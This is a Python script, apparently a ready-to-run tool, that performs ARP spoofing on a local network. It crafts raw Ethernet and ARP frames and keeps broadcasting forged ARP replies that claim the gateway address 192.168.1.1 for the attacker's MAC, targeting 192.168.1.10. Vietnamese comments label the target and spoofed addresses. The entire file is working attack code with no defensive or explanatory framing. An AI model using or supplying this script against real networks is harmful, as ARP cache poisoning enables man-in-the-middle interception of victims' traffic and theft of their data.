import socket
import struct
import fcntl
import time
import os

def get_mac_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15].encode('utf-8')))
    return ':'.join(['%02x' % b for b in info[18:24]])

def create_arp_request(src_mac, src_ip, target_ip):
    ether_header = struct.pack('!6s6sH', b'\xff\xff\xff\xff\xff\xff', src_mac, 0x0806)
    arp_header = struct.pack('!HHBBH6s4s6s4s',
                             1, 0x0800, 6, 4, 1,
                             src_mac,
                             socket.inet_aton(src_ip),
                             b'\x00\x00\x00\x00\x00\x00',
                             socket.inet_aton(target_ip))
    return ether_header + arp_header

def create_arp_reply(src_mac, src_ip, target_mac, target_ip):
    ether_header = struct.pack('!6s6sH', target_mac, src_mac, 0x0806)
    arp_header = struct.pack('!HHBBH6s4s6s4s',
                             1, 0x0800, 6, 4, 2,
                             src_mac,
                             socket.inet_aton(src_ip),
                             target_mac,
                             socket.inet_aton(target_ip))
    return ether_header + arp_header

def send_arp_packet(packet, interface):
    raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    raw_socket.bind((interface, socket.SOCK_RAW))
    raw_socket.send(packet)

def arp_spoof(target_ip, spoof_ip, interface):
    src_mac = get_mac_address(interface)
    src_mac_bytes = bytes.fromhex(src_mac.replace(':', ''))

    while True:
        arp_reply = create_arp_reply(src_mac_bytes, spoof_ip, b'\xff\xff\xff\xff\xff\xff', target_ip)
        send_arp_packet(arp_reply, interface)
        time.sleep(2)

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # Địa chỉ IP mục tiêu
    spoof_ip = "192.168.1.1"    # Địa chỉ IP muốn giả mạo
    interface = "eth0"           # Tên giao diện mạng

    try:
        arp_spoof(target_ip, spoof_ip, interface)
    except KeyboardInterrupt:
        print("\nARP spoofing stopped.")
        os._exit(0)
